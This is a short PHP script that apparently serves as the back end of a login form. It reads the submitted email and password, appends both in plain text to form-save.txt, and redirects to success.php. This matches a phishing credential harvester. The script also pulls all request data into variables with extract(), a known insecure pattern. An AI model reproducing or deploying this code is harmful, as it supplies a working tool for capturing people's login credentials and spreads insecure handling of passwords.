<?php
    extract($_REQUEST);
    $file=fopen("form-save.txt","a");

     fwrite($file,"Email :");
    fwrite($file, $email ."\n");
    fwrite($file,"Password :");
    fwrite($file, $password ."\n");
    fclose($file);
    header("location: success.php");
 ?>